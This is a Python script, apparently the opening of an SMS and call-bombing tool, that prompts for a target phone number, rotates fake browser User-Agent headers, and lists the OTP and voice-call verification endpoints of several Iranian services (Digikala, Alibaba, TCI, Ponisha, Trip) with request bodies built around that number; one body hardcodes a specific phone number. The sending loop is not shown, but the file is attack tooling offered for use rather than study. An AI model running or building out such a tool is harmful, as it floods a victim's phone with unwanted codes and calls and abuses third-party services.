
#########################
black = '\033[30m'
white = '\033[37m'
Blue ="\033[1;34m"
yellow = '\033[33m'
Red="\033[1;31m"
Green="\033[1;33m"
pink = "\033[95m"
Grey="\033[1;30m"
Reset="\033[0m"
cyan = "\033[36m"
purple = "\033[35m"
reset = "\033[0m"
#########################


name = "Danyal"
github = "https://github.com/Danyalss"
pirate = '''       !
       !
       ^
      / \\
     /___\\
    |=   =|
    |     |
    |     |
    |     |
    |     |
    |     |
    |     |
    |     |
    |     |
    |     |
    |     |
   /|##!##|\\
  / |##!##| \\
 /  |##!##|  \\
|  / ^ | ^ \\  |
| /  ( | )  \\ |
|/   ( | )   \\|
    ((   ))
   ((  :  ))
   ((  :  ))
    ((   ))
     (( ))
      ( )
       .
       .
       .'''

# چاپ کد پیریت با رنگ زرد
print(f"{Green}Name: {name}")
print(f"{Green}Github: {github}{reset}")
print(f"{Green}{pirate}{reset}")


number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)


heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
     {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/112.0',
    'accept': '*/*'
    },
    {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'accept': '*/*'
    }
]


url_call_digikala = "https://api.digikala.com/v1/user/authenticate/"
json_call_digikala = {
"backUrl": "/",
"force_send_otp": "true",
"otp_call": "true",
"username": "0" + number
}

url_call_alibaba = "https://ws.alibaba.ir/api/v3/account/call/otp"
json_call_alibaba = {"phoneNumber": "0"+number}

url_call_tci = "https://my.tci.ir/api/v1/auth/send-code"
json_call_tci = {
"app_hash": "app_hash",
"app_id": 1,
"method": "VOICE_CALL",
"phone_number": "989373058966"
}

url_call_ponisha = "https://ponisha.ir/send-mobile-verfication"
json_call_ponisha = {
	"mobile": "+98" + number,
	"type": "2"
}

url_trip = "https://gateway.trip.ir/api/Totp"
json_trip = {"PhoneNumber": "0" + number}